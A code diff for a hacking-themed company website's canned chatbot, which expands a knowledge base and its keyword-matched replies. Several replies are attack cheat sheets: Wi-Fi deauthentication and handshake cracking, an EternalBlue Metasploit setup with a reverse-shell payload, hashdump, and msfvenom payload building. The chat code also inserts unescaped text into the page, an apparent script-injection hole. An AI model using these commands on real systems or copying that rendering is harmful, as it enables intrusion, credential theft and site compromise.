@@ -885,20 +885,27 @@ function initMagneticButtons() {
 // 100% Guaranteed Uptime · Multi-Model Support · Smart Fallback
 // =========================================================
 const NEXO_KNOWLEDGE_BASE = {
-  identity: "NEXO-TECHNOLOGIES is an advanced software engineering and cybersecurity collective specializing in low-level system development, full-stack web applications, Linux optimization, and ethical hacking automation.",
-  skills: "Our core language matrix includes Python (95%), Shell/Bash (92%), Java (88%), JavaScript/Node.js (85%), C++ (82%), Rust (78%), Golang (74%), and Dart/Flutter (72%).",
-  services: "We offer Web Development ($200 - $1000+), App Development ($800 - $5000+), Security Auditing & Penetration Testing, Custom Automation Scripts, and Network Tooling.",
-  projects: "Featured tools:\n1. DEMONIC-BOT: Intelligent WhatsApp automation engine in Node.js.\n2. DEMONIC_TOOLS: Full Linux security & administration suite.\n3. NEXO-TECH IP Flooder: Multi-threaded network stress tester built in Rust.\n4. Innovation Lab R&D: CryptVault and AutoPwn framework.",
-  contact: "Official communication channels:\n• WhatsApp: +234 704 4339 491\n• Email: demonalexander526@gmail.com\n• Telegram: @Vershdit\n• GitHub: github.com/demonalexander526-alt",
-  hacking: "All cybersecurity tools and methodologies under NEXO-TECHNOLOGIES are designed strictly for authorized security auditing, infrastructure hardening, and defensive penetration testing.",
-  pricing: "Pricing overview:\n• Standard Website: $200\n• Commercial Web Platform: $500\n• Premium Custom Architecture: $1000+\n• Native/Cross-Platform Mobile App: $1500 - $2500\n• Enterprise Custom Suite: $5000+"
+  identity: "NEXO-TECHNOLOGIES is an elite software engineering collective and cybersecurity research corp founded in 2021 by Alexander (demonalexander526). We engineer high-concurrency distributed backends, memory-safe system utilities in Rust & C++, custom penetration testing frameworks, and high-impact web and mobile platforms.",
+  skills: "Core technical proficiency matrix:\n• Python (95%): Exploit automation (scapy, paramiko, socket), FastAPI backends, NLP engines.\n• Shell/Bash (92%): Linux administration, Termux security toolkits, automated hardening.\n• Java (88%): Enterprise Spring Boot microservices, high-throughput worker pools, Android native.\n• JavaScript/Node.js (85%): Baileys WhatsApp bot architecture, WebGL & Canvas 2D graphics, async event loops.\n• C++ / C# (82%): Direct memory manipulation, pointers, RAII, .NET Core security applications.\n• Rust (78%): Zero-cost abstractions, borrow checker memory safety, Tokio async I/O socket streaming.\n• Golang (74%): Lightweight goroutines, high-concurrency network scanners, self-contained binaries.\n• Dart/Flutter (72%): Cross-platform iOS, Android, and Web native interfaces.",
+  services: "Commercial engineering catalog:\n• Web Architecture: Standard ($200) · Commercial ($500) · Enterprise Custom ($1000+)\n• Mobile Applications: MVP ($800) · Native iOS/Android ($1500) · Cross-Platform Flutter ($2500) · Enterprise ($5000+)\n• Security Audits: Web App OWASP Pentest, Linux Server Hardening, Codebase Vulnerability Auditing.",
+  projects: "Active battle-tested weapon cache & Flagship OS:\n 1. ASTERIX-OS: Custom cyber operating system & hardened kernel — the company pride of NEXO-TECHNOLOGIES.\n2. Asterix-Anti-Network-Attack: Real-time autonomous DDoS mitigation & defensive packet scrubber.\n3. APEX-OVERDRIVE: High-concurrency async load generator & stress benchmark.\n4. LIGHTNING: Ultra-fast low-latency socket dispatcher.\n5. REDOX-PY_SCANNER: Python network vulnerability & port audit suite.\n6. THUNDER: High-throughput parallel socket driver.\n7. DEMONIC-BOT: Intelligent WhatsApp multi-purpose bot built on Node.js and Baileys.\n8. DEMONIC_TOOLS: Comprehensive Linux security administration toolkit.\n9. NEXO-TECH IP FLOODER: High-performance network stress tester written in Rust.\n10. R&D Innovation Lab: CryptVault zero-knowledge vault and AutoPwn red-team framework.",
+  asterixos: " ASTERIX-OS // THE FLAGSHIP CYBER OPERATING SYSTEM & COMPANY PRIDE OF NEXO-TECHNOLOGIES:\n• Architecture: Custom security-hardened Linux/Microkernel hybrid distribution engineered from the ground up for extreme red-team operations, autonomous network defense, and zero-telemetry operational security.\n• Repositories: Official GitHub (https://github.com/NEXO-TECHNOLOGIES/ASTERIX-OS.git) & Official GitLab (https://gitlab.com/nexo-technologies-group/asterix-os.git).\n• Integrated Defensive Core: Pre-baked with Asterix-Anti-Network-Attack scrubbing daemons, native eBPF kernel packet filters, post-quantum CRYSTALS-Kyber memory encryption, and zero-latency terminal hypervisor.\n• Pre-installed Arsenal: APEX-OVERDRIVE, LIGHTNING, REDOX-PY_SCANNER, THUNDER, DEMONIC_TOOLS, and NEXO IP FLOODER.",
+  contact: "Official communication matrices:\n• WhatsApp: +234 704 4339 491 (Direct Hotline)\n• Email: demonalexander526@gmail.com\n• Telegram: @Vershdit\n• GitHub: github.com/demonalexander526-alt\n• Location: Lagos, Nigeria // Global Deployments",
+  hacking: "Cybersecurity operations adhere to rigorous red-team defensive testing. Framework covers: Reconnaissance (Nmap, Shodan, REDOX-PY_SCANNER), Vulnerability Analysis (CVE databases), Exploitation (Metasploit, APEX-OVERDRIVE, THUNDER, custom Python payloads), and Real-time Defense (Asterix-Anti-Network-Attack, ASTERIX-OS eBPF filters).",
+  wifi: "Wireless Penetration Testing (802.11 frames):\n1. Monitor Mode: `airmon-ng start wlan0`\n2. Packet Sniffing: `airodump-ng mon0` to capture BSSID & channel\n3. Deauth Attack: `aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> mon0`\n4. 4-Way Handshake Capture: Extract EAPOL handshake\n5. Offline Cracking: `aircrack-ng -w wordlist.txt capture-01.cap`\nDefensive hardening: Enforce WPA3-SAE with Protected Management Frames (PMF).",
+  metasploit: "Metasploit Framework & Exploit Delivery:\n• Console: `msfconsole -q` | Search: `search eternalblue` (MS17-010)\n• Configuration: `use exploit/windows/smb/ms17_010_eternalblue` -> `set RHOSTS <IP>` -> `set LHOST <IP>`\n• Payload: `set PAYLOAD windows/x64/meterpreter/reverse_tcp` -> `exploit`\n• Meterpreter commands: `sysinfo`, `getsystem`, `hashdump`, `shell`\n• Payload generator: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o payload.exe`",
+  wireshark: "Wireshark Packet Dissection & Network Forensics:\n• Capture filters: `tcpdump -i eth0 -nn -s0 -w traffic.pcap`\n• Key display filters:\n  - `http.request.method == \"POST\"` (Credentials & forms)\n  - `tcp.flags.syn == 1 && tcp.flags.ack == 0` (SYN port scan detection)\n  - `dns.flags.response == 0` (DNS queries)\n• TCP Stream Reconstruction: Follow -> TCP Stream to recover plaintext payload bytes.",
+  crypto: "Modern Cryptographic Implementations:\n• Symmetric: AES-256-GCM and Fernet (`cryptography.fernet` in Python with PBKDF2 HMAC SHA-256 key derivation).\n• Asymmetric: RSA-4096 and ECC Curve25519 for public key exchange.\n• Hashing: SHA-256 / SHA-512 with salt, bcrypt/argon2 for password storage.",
+  linux: "Linux Kernel Hardening & Defense-in-Depth:\n• Kernel parameters (`/etc/sysctl.conf`): disable IP forwarding, ignore ICMP echo broadcasts, enable TCP SYN cookies (`net.ipv4.tcp_syncookies = 1`), randomize memory space (`kernel.randomize_va_space = 2`).\n• Firewall: `ufw default deny incoming`, `ufw allow 22/tcp`, `ufw allow 443/tcp`.\n• Intrusion Prevention: Fail2ban jails for SSH brute-force protection.\n• Next-Gen OS: Powered by ASTERIX-OS custom kernel distribution.",
+  rust: "Rust Systems Programming:\n• Zero-cost abstractions compiling directly to machine code.\n• Memory safety without garbage collection enforced by the borrow checker (eliminating use-after-free, buffer overflows, data races).\n• Tokio runtime for asynchronous concurrency with non-blocking socket loops.",
+  python: "Python Cyber Automation:\n• Exploit development with `scapy` for raw packet forging.\n• SSH remote command execution with `paramiko`.\n• Asynchronous REST API backends with `fastapi` and `pydantic`.\n• Network recon with REDOX-PY_SCANNER."
 };
 
 const AI_MODELS = [
-  { id: 'deepseek-v4-flash:cloud', name: 'DeepSeek Flash', icon: '⚡', color: '#00f5ff', promptMod: 'Fast, precise, technical cyberpunk response.' },
-  { id: 'qwen3.8', name: 'Qwen 3.8', icon: '🔮', color: '#bf00ff', promptMod: 'Deep analytical and architectural breakdown.' },
-  { id: 'nemotron-3.5-lightning', name: 'Nemotron Lightning', icon: '🌩️', color: '#ffd700', promptMod: 'Aggressive optimization and performance metrics.' },
-  { id: 'gemma4', name: 'Gemma 4', icon: '💎', color: '#00ff88', promptMod: 'Balanced, secure, and structured cybersecurity focus.' }
+  { id: 'deepseek-v4-flash:cloud', name: 'DeepSeek Flash', icon: '<i class="fas fa-bolt"></i>', color: '#00f5ff', promptMod: 'Fast, precise, technical cyberpunk response.' },
+  { id: 'qwen3.8', name: 'Qwen 3.8', icon: '<i class="fas fa-brain"></i>', color: '#bf00ff', promptMod: 'Deep analytical and architectural breakdown.' },
+  { id: 'nemotron-3.5-lightning', name: 'Nemotron Lightning', icon: '<i class="fas fa-tachometer-alt"></i>', color: '#ffd700', promptMod: 'Aggressive optimization and performance metrics.' },
+  { id: 'gemma4', name: 'Gemma 4', icon: '<i class="fas fa-shield-halved"></i>', color: '#00ff88', promptMod: 'Balanced, secure, and structured cybersecurity focus.' }
 ];
 
 let selectedModel = 'deepseek-v4-flash:cloud';
@@ -908,28 +915,55 @@ let floatConversationHistory = [];
 function generateSmartAIResponse(query, modelId) {
   const q = query.toLowerCase();
   const model = AI_MODELS.find(m => m.id === modelId) || AI_MODELS[0];
-  
-  let response = '';
-  
-  if (q.includes('who') || q.includes('about') || q.includes('nexo') || q.includes('what is')) {
-    response = `[${model.name.toUpperCase()} // NEURAL CORE]\n${NEXO_KNOWLEDGE_BASE.identity}\n\nWe design resilient systems, create bespoke penetration testing scripts, and craft blazing-fast web architectures.`;
-  } else if (q.includes('language') || q.includes('skill') || q.includes('stack') || q.includes('tech') || q.includes('python') || q.includes('rust')) {
-    response = `[${model.name.toUpperCase()} // TECH MATRIX]\n${NEXO_KNOWLEDGE_BASE.skills}\n\nWe specialize in low-level memory safety (Rust), asynchronous event-driven networking (Node.js/Go), and rapid security automation (Python/Shell).`;
-  } else if (q.includes('service') || q.includes('price') || q.includes('cost') || q.includes('hire') || q.includes('web') || q.includes('app')) {
-    response = `[${model.name.toUpperCase()} // CATALOG & PRICING]\n${NEXO_KNOWLEDGE_BASE.pricing}\n\nReady to initiate a project? Reach us on WhatsApp at +234 704 4339 491.`;
-  } else if (q.includes('project') || q.includes('tool') || q.includes('bot') || q.includes('flooder') || q.includes('demonic')) {
-    response = `[${model.name.toUpperCase()} // ARSENAL INDEX]\n${NEXO_KNOWLEDGE_BASE.projects}\n\nCheck out the full weapon cache on our Arsenal (/tools.html) and Lab (/lab.html) pages.`;
-  } else if (q.includes('contact') || q.includes('whatsapp') || q.includes('email') || q.includes('telegram') || q.includes('reach')) {
-    response = `[${model.name.toUpperCase()} // COMM CHANNELS]\n${NEXO_KNOWLEDGE_BASE.contact}`;
-  } else if (q.includes('hack') || q.includes('security') || q.includes('cyber') || q.includes('pentest') || q.includes('linux')) {
-    response = `[${model.name.toUpperCase()} // SECURITY PROTOCOLS]\n${NEXO_KNOWLEDGE_BASE.hacking}\n\nExplore our interactive hacking matrix on /hacking.html and our practical Academy on /learn-hacking.html.`;
-  } else if (q.includes('hello') || q.includes('hi') || q.includes('hey') || q.includes('greetings')) {
-    response = `[${model.name.toUpperCase()} // ONLINE]\nGreetings operator. NEXO-AI neural core is synchronized. Query me regarding our engineering capabilities, pricing packages, active tools, or cybersecurity research.`;
-  } else {
-    response = `[${model.name.toUpperCase()} // SYNAPSE]\nQuery received: "${query}"\n\nNEXO-TECHNOLOGIES engineers high-performance architectures, penetration testing frameworks, and custom digital software.\n\nType your query or check our Arsenal (/tools.html), Terminal (/terminal.html), or Lab (/lab.html) for active modules.`;
+  const tag = `[${model.name.toUpperCase()} // NEURAL CORE]`;
+
+  if (q.includes('os') || q.includes('asterix-os') || q.includes('operating system') || q.includes('distro') || q.includes('kernel')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.asterixos}\n\nDirect Repositories:\n• GitHub: https://github.com/NEXO-TECHNOLOGIES/ASTERIX-OS.git\n• GitLab: https://gitlab.com/nexo-technologies-group/asterix-os.git\n\nExperience the live ASTERIX-OS Spotlight on index.html!`;
   }
-  
-  return response;
+  if (q.includes('who') || q.includes('about') || q.includes('nexo') || q.includes('what is') || q.includes('alexander') || q.includes('founder')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.identity}\n\nFlagship Centerpiece: ASTERIX-OS — The Custom Cyber Operating System & Hardened Kernel.\nKey Focus Areas: Low-level systems engineering (Rust/C++), enterprise full-stack development, and defensive cybersecurity auditing.`;
+  }
+  if (q.includes('wifi') || q.includes('wireless') || q.includes('aircrack') || q.includes('handshake') || q.includes('wpa')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.wifi}`;
+  }
+  if (q.includes('metasploit') || q.includes('meterpreter') || q.includes('msfvenom') || q.includes('payload') || q.includes('exploit')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.metasploit}`;
+  }
+  if (q.includes('wireshark') || q.includes('packet') || q.includes('sniff') || q.includes('pcap') || q.includes('tcpdump')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.wireshark}`;
+  }
+  if (q.includes('crypto') || q.includes('encrypt') || q.includes('aes') || q.includes('fernet') || q.includes('hash') || q.includes('sha')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.crypto}`;
+  }
+  if (q.includes('linux') || q.includes('kernel') || q.includes('harden') || q.includes('sysctl') || q.includes('ufw') || q.includes('firewall')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.linux}`;
+  }
+  if (q.includes('rust') || q.includes('cargo') || q.includes('tokio') || q.includes('memory safe')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.rust}`;
+  }
+  if (q.includes('python') || q.includes('scapy') || q.includes('fastapi') || q.includes('django')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.python}`;
+  }
+  if (q.includes('language') || q.includes('skill') || q.includes('stack') || q.includes('tech') || q.includes('languages') || q.includes('golang') || q.includes('c++')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.skills}`;
+  }
+  if (q.includes('service') || q.includes('price') || q.includes('cost') || q.includes('hire') || q.includes('web') || q.includes('app') || q.includes('package')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.services}\n\nDirect Inquiry: WhatsApp +234 704 4339 491 or Email demonalexander526@gmail.com.`;
+  }
+  if (q.includes('project') || q.includes('tool') || q.includes('bot') || q.includes('flooder') || q.includes('demonic') || q.includes('arsenal')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.projects}\n\nExplore live interactive simulators on /tools.html and R&D trackers on /lab.html.`;
+  }
+  if (q.includes('contact') || q.includes('whatsapp') || q.includes('email') || q.includes('telegram') || q.includes('reach')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.contact}`;
+  }
+  if (q.includes('hack') || q.includes('security') || q.includes('cyber') || q.includes('pentest')) {
+    return `${tag}\n${NEXO_KNOWLEDGE_BASE.hacking}\n\nInspect our Global Attack Radar on /hacking.html and CTF Challenges on /learn-hacking.html.`;
+  }
+  if (q.includes('hello') || q.includes('hi') || q.includes('hey') || q.includes('greetings') || q.includes('yo')) {
+    return `${tag}\nGreetings operator. NEXO-AI neural matrix is fully synced.\nAsk me anything about cybersecurity tools, penetration testing, systems programming (Rust/Python/C++), pricing packages, or custom bot architectures.`;
+  }
+
+  return `${tag}\nQuery processed: "${query}"\n\nNEXO-TECHNOLOGIES engineers military-grade digital architecture, automated red-team tooling, and polyglot software solutions.\n\nQuick Commands:\n• Ask about our Arsenal tools (DEMONIC-BOT, IP Flooder)\n• Ask about Penetration Testing (Metasploit, Wireshark, WPA2)\n• Ask about Programming Languages or Service Packages\n• Or open the Holographic Command Palette with [Ctrl+K]!`;
 }
 
 function initAIChat() {
@@ -1016,6 +1050,7 @@ async function sendChatMessage() {
   if (!text) return;
   input.value = '';
   
+  if (window.NexoAudio) window.NexoAudio.playLaser();
   addChatMessage(container, 'user', text);
   showTypingIndicator(container);
   
@@ -1024,6 +1059,7 @@ async function sendChatMessage() {
   setTimeout(() => {
     removeTypingIndicator(container);
     addChatMessage(container, 'ai', reply);
+    if (window.NexoAudio) window.NexoAudio.playSuccess();
   }, 350 + Math.random() * 300);
 }
 
@@ -1036,6 +1072,7 @@ async function sendFloatChatMessage() {
   if (!text) return;
   input.value = '';
   
+  if (window.NexoAudio) window.NexoAudio.playLaser();
   addChatMessage(container, 'user', text);
   showTypingIndicator(container);
   
@@ -1044,6 +1081,7 @@ async function sendFloatChatMessage() {
   setTimeout(() => {
     removeTypingIndicator(container);
     addChatMessage(container, 'ai', reply);
+    if (window.NexoAudio) window.NexoAudio.playSuccess();
   }, 300 + Math.random() * 250);
 }
 
@@ -1054,6 +1092,27 @@ function sendQuickMessage(text) {
     sendChatMessage();
   }
 }
+
+function speakNexoAi(text) {
+  if (!('speechSynthesis' in window)) return;
+  window.speechSynthesis.cancel();
+  const clean = text.replace(/\[.*?\]/g, '').replace(/[#*`_]/g, '');
+  const utter = new SpeechSynthesisUtterance(clean);
+  utter.rate = 1.05;
+  utter.pitch = 0.85; // cyber pitch
+  window.speechSynthesis.speak(utter);
+}
+window.speakNexoAi = speakNexoAi;
+
+function copyNexoText(text, btn) {
+  navigator.clipboard.writeText(text).then(() => {
+    const orig = btn.innerHTML;
+    btn.innerHTML = '<i class="fas fa-check"></i>';
+    if (window.NexoAudio) window.NexoAudio.playSuccess();
+    setTimeout(() => { btn.innerHTML = orig; }, 2000);
+  });
+}
+window.copyNexoText = copyNexoText;
 
 function addChatMessage(container, role, content) {
   const msgDiv = document.createElement('div');
@@ -1067,11 +1126,20 @@ function addChatMessage(container, role, content) {
     : '<div class="msg-avatar ai-msg-avatar" style="background:rgba(0,245,255,.15);border:1px solid rgba(0,245,255,.3);color:#00f5ff"><i class="fas fa-robot"></i></div>';
   
   const formattedContent = content.replace(/\n/g, '<br>');
+  const escapedContent = content.replace(/'/g, "\\'").replace(/"/g, '&quot;');
   
+  const actionsHtml = role === 'ai'
+    ? `<div class="msg-actions" style="display:flex;gap:6px;margin-top:6px">
+         <button class="msg-action-btn" onclick="copyNexoText('${escapedContent}', this)" title="Copy Text"><i class="fas fa-copy"></i></button>
+         <button class="msg-action-btn" onclick="speakNexoAi('${escapedContent}')" title="Cyber Voice"><i class="fas fa-volume-up"></i></button>
+       </div>`
+    : '';
+
   msgDiv.innerHTML = `
     ${avatarHtml}
     <div class="msg-bubble">
       ${formattedContent}
+      ${actionsHtml}
       <span class="msg-time">${timeStr} // NEXO_CORE</span>
     </div>
   `;
